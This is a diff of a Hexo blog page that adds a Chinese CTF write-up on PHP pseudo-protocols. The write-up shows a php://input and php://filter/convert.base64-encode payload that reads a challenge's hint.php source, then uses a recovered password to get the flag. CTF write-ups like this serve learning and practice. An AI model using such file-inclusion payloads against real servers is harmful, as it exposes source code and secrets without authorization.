@@ -66,6 +66,88 @@
       
         
 
+<article id="post-php伪协议" class="article article-type-post" itemscope itemprop="blogPost" data-scroll-reveal>
+  
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h2 itemprop="name">
+      <a class="article-title" href="/2020/01/12/php%E4%BC%AA%E5%8D%8F%E8%AE%AE/">php伪协议</a>
+    </h2>
+  
+  
+
+
+
+
+      </header>
+    
+
+    
+      <div class="article-meta">
+        <a href="/2020/01/12/php%E4%BC%AA%E5%8D%8F%E8%AE%AE/" class="article-date">
+  <time datetime="2020-01-12T13:30:55.096Z" itemprop="datePublished">2020-01-12</time>
+</a>
+        
+      </div>
+    
+
+    
+
+    <div class="article-entry" itemprop="articleBody">
+      
+
+
+      
+
+      
+        <h1 id="php伪协议"><a href="#php伪协议" class="headerlink" title="php伪协议"></a>php伪协议</h1><p>看一道题</p>
+<p>上图</p>
+<p><img src="https://i.loli.net/2020/01/12/xvLJ782TrQch6MC.png" alt="QQ截图20200112210840.png"></p>
+<p>可知涉及到php伪协议的问题</p>
+<p>1.在file_get_contents 这里</p>
+<p>我们可以使用php://这个协议php://input可以得到原始的post数据</p>
+<p>2.在include（）这里我们可以看到后面有个提示hint.php</p>
+<p>但是我们把file=hint.php时仍然没有任何代码</p>
+<p>我们可以使用：</p>
+<p>php://filter/convert.base64-encode/resource=取源代码并进行base64编码输出</p>
+<p>若不使用base64编码，我们读取的内容会直接当做php代码执行就看不到源代码内容了。</p>
+<p>上payload</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?Yeedo&#x3D;php:&#x2F;&#x2F;input&amp;file&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;hint.php</span><br><span class="line"></span><br><span class="line">post:Yeedo is a big hacker</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://i.loli.net/2020/01/12/4SXqOdg3UrDKB7y.png" alt="QQ截图20200112212501.png"></p>
+<p>解码base64</p>
+<p>得到</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"><span class="comment">//decode(423e1e68bdc71183573da0cd33a1609)='ypcwelcome';</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>在之前的payload基础上添加</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">password&#x3D;ypcwelcome</span><br></pre></td></tr></table></figure>
+
+<p>得到flag</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;1a19cbc0200dc984ae400d331a7d1a3d&#125;</span><br></pre></td></tr></table></figure>
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://yoursite.com/2020/01/12/php%E4%BC%AA%E5%8D%8F%E8%AE%AE/" data-id="ck5b24h570000n8lu6a9x2yp8"
+         class="article-share-link">Share</a>
+      
+    </footer>
+
+  </div>
+
+  
+
+  
+
+</article>
+
+
+
+      
+        
+
 <article id="post-第四季答题赛 pwn" class="article article-type-post" itemscope itemprop="blogPost" data-scroll-reveal>
   
   <div class="article-inner">
@@ -622,68 +704,6 @@
 
 
       
-        
-
-<article id="post-sqli-lab 学习记录 less3-less4" class="article article-type-post" itemscope itemprop="blogPost" data-scroll-reveal>
-  
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h2 itemprop="name">
-      <a class="article-title" href="/2019/12/16/sqli-lab%20%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95%20less3-less4/">sqli-lab 学习记录 less3-less4</a>
-    </h2>
-  
-  
-
-
-
-
-      </header>
-    
-
-    
-      <div class="article-meta">
-        <a href="/2019/12/16/sqli-lab%20%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95%20less3-less4/" class="article-date">
-  <time datetime="2019-12-16T02:37:33.917Z" itemprop="datePublished">2019-12-16</time>
-</a>
-        
-      </div>
-    
-
-    
-
-    <div class="article-entry" itemprop="articleBody">
-      
-
-
-      
-
-      
-        <h2 id="sqli-lab-学习记录-less3-less4"><a href="#sqli-lab-学习记录-less3-less4" class="headerlink" title="sqli-lab 学习记录  less3-less4"></a>sqli-lab 学习记录  less3-less4</h2>
-        
-          <a class="article-more-link" href="/2019/12/16/sqli-lab%20%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95%20less3-less4/">Read More...</a>
-        
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://yoursite.com/2019/12/16/sqli-lab%20%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95%20less3-less4/" data-id="ck48fez3j000bhsu34k00emnp"
-         class="article-share-link">Share</a>
-      
-    </footer>
-
-  </div>
-
-  
-
-  
-
-</article>
-
-
-
-      
   </article>
   
 
@@ -706,7 +726,7 @@
 </ul>
     </div>
     <ul class="list-inline">
-      <li>&copy; 2019 summerN&#39;s blog</li>
+      <li>&copy; 2020 summerN&#39;s blog</li>
       <li>Powered by <a href="http://hexo.io/" target="_blank">Hexo</a></li>
       <li>Theme  <a href="https://github.com/zhwangart/hexo-theme-ocean" target="_blank" rel="noopener">Ocean</a></li>
     </ul>
